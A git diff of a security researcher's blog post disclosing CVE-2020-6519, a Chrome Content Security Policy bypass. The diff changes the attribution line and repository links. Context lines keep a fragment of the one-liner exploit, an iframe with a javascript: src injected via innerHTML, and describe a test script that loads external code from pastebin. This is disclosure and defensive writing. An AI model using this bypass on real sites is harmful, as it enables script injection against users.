@@ -5,8 +5,6 @@ url: https://weizman.github.io/
 date: 02/09/2020
 ---
 
-_Originally was posted on [Perimeterx](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/) (The company I was working for at the time this article was written)_
-
 > This is the story of how I found and helped **Google** [patch](https://chromereleases.googleblog.com/2020/07/stable-channel-update-for-desktop.html#:\~:text=Gal%20Weizman%20(@WeizmanGal)%20of%20PerimeterX) a [**vulnerability in Chrome browser**](https://nvd.nist.gov/vuln/detail/CVE-2020-6519) that could have allowed attackers to [**fully bypass CSP rules**](https://crbug.com/1064676) since Chrome 73 (March 2019), and how researching it taught me that today's CSP mechanism design is the reason **no one uses CSP correctly and therefore many of the biggest websites in the world are exposed to this vulnerability**.
 
 ### Bypassing CSP completely can be very bad..
@@ -21,7 +19,7 @@ So what was the vulnerability exactly?
 
 ### Break CSP Down Completely With A One-Liner
 
-You are more than welcome to check out the [POC files as disclosed to Google Chrome project](https://github.com/PerimeterX/CVE-2020-6519/tree/master/POC) originally if you are interested in the exploit and in running it, but the following sum up should cover it mostly:
+You are more than welcome to check out the [POC files as disclosed to Google Chrome project](https://github.com/weizman/CVE-2020-6519/tree/master/POC) originally if you are interested in the exploit and in running it, but the following sum up should cover it mostly:
 
 Normally, an attempt to run the following JS code will be blocked by the browser when the site’s CSP setting disallows the source or actions performed by the script:
 
@@ -47,7 +45,7 @@ document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = documen
 
 ![5](./content/img/5a.gif)
 
-It is worth mentioning that some sites protected by CSP, like [Twitter](http://twitter.com/), [Github](http://github.com/), [LinkedIn](https://www.linkedin.com/), [Google Play Store](https://play.google.com), [Yahoo's Login Page](https://login.yahoo.com), [PayPal](https://paypal.com) and [Yandex](https://yandex.ru) were not vulnerable to [CVE-2020-6519](https://github.com/PerimeterX/CVE-2020-6519/), as these implemented CSP using [nonce](https://content-security-policy.com/nonce/) or [hash](https://content-security-policy.com/hash/) and by that added a layer of security that is implemented on the server side as well as the client side.
+It is worth mentioning that some sites protected by CSP, like [Twitter](http://twitter.com/), [Github](http://github.com/), [LinkedIn](https://www.linkedin.com/), [Google Play Store](https://play.google.com), [Yahoo's Login Page](https://login.yahoo.com), [PayPal](https://paypal.com) and [Yandex](https://yandex.ru) were not vulnerable to [CVE-2020-6519](https://github.com/weizman/CVE-2020-6519/), as these implemented CSP using [nonce](https://content-security-policy.com/nonce/) or [hash](https://content-security-policy.com/hash/) and by that added a layer of security that is implemented on the server side as well as the client side.
 
 ### What is the potential impact?
 
@@ -67,18 +65,18 @@ I disagree.
 
 It is extremely risky when a vulnerability is found in the security mechanism that prevents such breaches, as the impacted sites actively relied on CSP to provide the protection tier.
 
-About 6 months ago I found a [persistent XSS in WhatsApp Web/Desktop applications and demonstrated the severity of this vulnerability](https://www.perimeterx.com/tech-blog/2020/whatsapp-fs-read-vuln-disclosure/).
+About 6 months ago I found a [persistent XSS in WhatsApp Web/Desktop applications and demonstrated the severity of this vulnerability](https://weizman.github.io/page-whatsapp-vuln/).
 
 Part of the reason the severity was so high is because their CSP was misconfigured in such a way that allowed me to inject scripts that could communicate with any domain I wanted.
 
 This is why. Finding ways to execute code on a website you don't control is indeed extremely difficult.
 But once someone has, you'd wish your website had another layer of security that might stop them from causing real damage.
 
-You can read all about this research right [here](https://www.perimeterx.com/tech-blog/2020/whatsapp-fs-read-vuln-disclosure/).
+You can read all about this research right [here](https://weizman.github.io/page-whatsapp-vuln/).
 
 ### Test It Yourself
 
-I was easily able to test all of those websites by creating a [simple script](https://github.com/PerimeterX/CVE-2020-6519/blob/master/CVE-2020-6519-TEST-IT-YOURSELF.js) that when executed via the devtools console will let you know immediately whether the current browser/website is vulnerable to [CVE-2020-6519](https://nvd.nist.gov/vuln/detail/CVE-2020-6519) due to misconfigured CSP/Old Chrome or not. It does that by trying to load an external js script from [https://pastebin.com/raw/XpHsfXJQ](https://pastebin.com/raw/XpHsfXJQ) both normally and by trying to load the exploit as well:
+I was easily able to test all of those websites by creating a [simple script](https://github.com/weizman/CVE-2020-6519/blob/master/CVE-2020-6519-TEST-IT-YOURSELF.js) that when executed via the devtools console will let you know immediately whether the current browser/website is vulnerable to [CVE-2020-6519](https://nvd.nist.gov/vuln/detail/CVE-2020-6519) due to misconfigured CSP/Old Chrome or not. It does that by trying to load an external js script from [https://pastebin.com/raw/XpHsfXJQ](https://pastebin.com/raw/XpHsfXJQ) both normally and by trying to load the exploit as well:
 
 > _Browser and Website are vulnerable_
 
